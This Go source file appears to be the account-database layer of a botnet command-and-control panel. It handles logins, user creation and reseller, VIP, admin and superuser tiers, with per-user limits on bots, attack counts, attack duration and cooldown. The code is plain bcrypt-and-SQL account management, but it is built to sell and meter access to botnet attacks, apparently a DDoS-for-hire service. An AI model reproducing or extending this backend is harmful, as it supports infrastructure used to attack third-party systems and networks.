package database

import (
	"database/sql"
	"errors"
	"fmt"
	"time"

	"golang.org/x/crypto/bcrypt"
)

type AccountInfo struct {
	ID, Bots, MaxAttacks, TotalAttacks, MaxTime, Cooldown int
	Username                                              string
	SuperUser, Admin, Reseller, Vip                       bool
	Expiry                                                time.Time
}

func (db *Database) Users() ([]AccountInfo, error) {
	query, err := db.db.Query("SELECT `id`, `username`, `max_bots`, `admin`, `cooldown`, `maxTime`, `vip`, `reseller`, `superuser` FROM `users`")
	if err != nil {
		return make([]AccountInfo, 0), err
	}

	var accounts = make([]AccountInfo, 0)

	for query.Next() {
		account := AccountInfo{}
		if err := query.Scan(
			&account.ID,
			&account.Username,
			&account.Bots,
			&account.Admin,
			&account.Cooldown,
			&account.MaxTime,
			&account.Vip,
			&account.Reseller,
			&account.SuperUser); err != nil {
			return make([]AccountInfo, 0), err
		}
		accounts = append(accounts, account)
	}

	return accounts, nil
}

func (db *Database) RemoveUser(username string) error {
	var userID int
	err := db.db.QueryRow("SELECT id FROM users WHERE username = ?", username).Scan(&userID)
	if err != nil {
		if errors.Is(err, sql.ErrNoRows) {
			return fmt.Errorf("user '%s' not found", username)
		}
		return err
	}

	_, err = db.db.Exec("DELETE FROM users WHERE id = ?", userID)
	if err != nil {
		return err
	}

	return nil
}

func (db *Database) ChangePassword(username, newPassword string) error {
	hashedPassword, err := bcrypt.GenerateFromPassword([]byte(newPassword), bcrypt.DefaultCost)
	if err != nil {
		return err
	}

	_, err = db.db.Exec("UPDATE users SET password = ? WHERE username = ?", hashedPassword, username)
	if err != nil {
		return err
	}

	return nil
}

func (db *Database) TryLogin(username string, password string, ip string) (bool, AccountInfo, error) {
	rows, err := db.db.Query("SELECT id, username, password, max_bots, admin, reseller, superuser, vip, maxAttacks, totalAttacks, expiry FROM users WHERE username = ?", username)
	if err != nil {
		return false, AccountInfo{}, err
	}
	defer func(rows *sql.Rows) {
		err := rows.Close()
		if err != nil {

		}
	}(rows)

	var accInfo AccountInfo
	var hashedPassword string
	var timestamp int64
	var adminInt, resellerInt, vipInt, superuserInt int

	if rows.Next() {
		err := rows.Scan(&accInfo.ID,
			&accInfo.Username,
			&hashedPassword,
			&accInfo.Bots,
			&adminInt,
			&resellerInt,
			&superuserInt,
			&vipInt,
			&accInfo.MaxAttacks,
			&accInfo.TotalAttacks,
			&timestamp)
		if err != nil {
			fmt.Println(err)
			return false, AccountInfo{}, err
		}

		err = bcrypt.CompareHashAndPassword([]byte(hashedPassword), []byte(password))
		if err != nil {

			return false, AccountInfo{}, err
		}

		accInfo.Admin = adminInt == 1
		accInfo.Reseller = resellerInt == 1
		accInfo.SuperUser = superuserInt == 1
		accInfo.Expiry = time.Unix(timestamp, 0)

		return true, accInfo, nil
	} else {
		return false, AccountInfo{}, fmt.Errorf("non-existant user logged in from %s [user=%s]\r\n", ip, username)
	}
}

func (db *Database) GetParent(username string, reseller string) bool {
	var createdBy string
	err := db.db.QueryRow("SELECT parent FROM users WHERE username = ?", username).Scan(&createdBy)
	if err != nil {
		fmt.Println(err)
		return false
	}
	return createdBy == reseller
}

func (db *Database) UserExists(username string) bool {
	var count int
	err := db.db.QueryRow("SELECT COUNT(*) FROM users WHERE username = ?", username).Scan(&count)
	if err != nil {
		fmt.Println(err)
		return false
	}
	return count > 0
}

func (db *Database) CreateUser(username, password, parent string, maxBots, maxAttacks, duration, cooldown int, isAdmin, isReseller, isVip bool, expiry int64) bool {
	hashedPassword, err := bcrypt.GenerateFromPassword([]byte(password), bcrypt.DefaultCost)
	if err != nil {
		fmt.Println(err)
		return false
	}

	_, err = db.db.Exec(`
        INSERT INTO users (username, password, max_bots, maxAttacks, maxTime, cooldown, expiry, admin, reseller, vip, parent)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`,
		username,
		hashedPassword,
		maxBots,
		maxAttacks,
		duration,
		cooldown,
		expiry,
		isAdmin,
		isReseller,
		isVip,
		parent,
	)

	if err != nil {
		fmt.Println(err)
		return false
	}

	return true
}

func (db *Database) IsAdmin(username string) (bool, error) {
	var isAdmin bool
	err := db.db.QueryRow("SELECT admin FROM users WHERE username = ?", username).Scan(&isAdmin)
	if err != nil {
		return false, err
	}
	return isAdmin, nil
}

func (db *Database) IsSuper(username string) bool {
	var isSuper bool
	err := db.db.QueryRow("SELECT superuser FROM users WHERE username = ?", username).Scan(&isSuper)
	if err != nil {
		return false
	}
	return isSuper
}

func (db *Database) IsVip(username string) (bool, error) {
	var isVip bool
	err := db.db.QueryRow("SELECT vip FROM users WHERE username = ?", username).Scan(&isVip)
	if err != nil {
		return false, err
	}
	return isVip, nil
}

func (db *Database) GetUserName(userid int) (string, bool) {
	var username string
	err := db.db.QueryRow("SELECT username FROM users WHERE id = ?", userid).Scan(&username)
	if err != nil {
		fmt.Println(err)
		return "", false
	}
	return username, true
}

func (db *Database) GetAccountInfo(username string) (AccountInfo, error) {
	rows, err := db.db.Query("SELECT id, username, max_bots, admin, reseller, superuser, vip, maxAttacks, totalAttacks, expiry FROM users WHERE username = ?", username)
	if err != nil {
		return AccountInfo{}, err
	}
	defer rows.Close()

	if rows.Next() {
		var accInfo AccountInfo
		var timestamp int64
		var adminInt, resellerInt, vipInt, superuserInt int

		err := rows.Scan(&accInfo.ID,
			&accInfo.Username,
			&accInfo.Bots,
			&adminInt,
			&resellerInt,
			&superuserInt,
			&vipInt,
			&accInfo.MaxAttacks,
			&accInfo.TotalAttacks,
			&timestamp)
		if err != nil {
			return AccountInfo{}, err
		}

		accInfo.Admin = adminInt == 1
		accInfo.Reseller = resellerInt == 1
		accInfo.SuperUser = superuserInt == 1
		accInfo.Expiry = time.Unix(timestamp, 0)

		return accInfo, nil
	}
	return AccountInfo{}, fmt.Errorf("user not found")
}
